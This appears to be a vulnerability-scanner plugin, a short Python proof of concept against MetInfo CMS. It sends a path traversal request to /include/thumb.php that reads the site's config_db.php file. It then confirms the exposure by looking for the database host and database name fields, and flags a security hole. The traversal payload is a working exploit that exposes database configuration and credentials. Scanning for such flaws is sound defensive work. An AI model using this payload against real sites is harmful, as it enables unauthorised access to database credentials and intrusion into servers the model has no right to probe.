#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'xfkxfk'

def assign(service, arg):
    if service == "metinfo":
        return True, arg

def audit(arg):
    url = arg
    _, head, body, _, _ = hackhttp.http(url + '/include/thumb.php?x=1&y=/../../../config&dir=config_db.php')
    if body and "<?php" in body and "con_db_host" in body and "con_db_name" in body:
        security_hole(url + '/include/thumb.php?x=1&y=/../../../config&dir=config_db.php')


        return arg
if __name__== '__main__':
    from dummy import *
